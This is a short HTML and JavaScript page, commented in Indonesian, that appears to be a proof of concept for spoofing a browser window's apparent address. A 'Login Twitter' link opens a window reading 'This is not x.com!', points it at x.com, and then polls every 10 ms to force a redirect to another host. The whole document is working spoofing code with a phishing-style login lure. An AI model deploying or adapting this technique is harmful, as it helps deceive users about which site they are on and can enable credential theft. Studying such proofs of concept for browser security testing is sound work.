<script>
  function next() {
    // Redirect langsung ke Google untuk memastikan alamat yang ingin ditampilkan
    w.location.replace('https://www.google.com:1234');
  }

  function f() {
    // Membuka window baru
    w = window.open("");  
    w.document.write('<h2>This is not x.com!</h2>');

    // Memberikan sedikit delay agar window baru bisa ter-load dengan benar
    setTimeout(function() {
      w.location = "https://x.com"; // Ganti lokasi ke x.com
    }, 500); // Memberikan waktu bagi window untuk siap

    // Menambahkan setInterval untuk memonitor perubahan URL
    i = setInterval(function() {
      try {
        let url = w.location.href;
        if (url !== 'https://x.com') {
          // Jika URL bukan yang diinginkan, lakukan redirect
          next();
        }
      } catch (e) {
        clearInterval(i);  // Jika terjadi error, hentikan interval
      }
    }, 10);  // Interval yang lebih cepat (10ms)
  }
</script>

<a href="#" onclick="f()">Login Twitter</a>
